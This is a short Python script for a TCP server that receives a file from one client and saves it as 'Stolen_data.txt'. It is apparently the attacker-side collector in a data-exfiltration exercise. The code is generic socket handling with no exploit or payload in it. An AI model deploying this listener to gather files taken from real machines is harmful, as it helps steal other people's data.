import socket
from tqdm import tqdm
def main():
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.bind(("192.168.27.2",8000))
    server.listen()
    conn, addr = server.accept()
    print(f" ** Client connected from {addr[0]}:{addr[1]}")
    data = conn.recv(1024).decode("utf-8")
    FILESIZE = int(data)
    FILENAME = "data.txt"
    bar = tqdm(range(FILESIZE), f"Receiving {FILENAME}", unit="B", unit_scale=True)
    with open(f"Stolen_{FILENAME}", "w") as f:
        while True:
            data = conn.recv(1024).decode("utf-8")
            if not data:
                break
            f.write(data)
            bar.update(len(data))
    conn.close()
    server.close()
if __name__ == "__main__":
    main()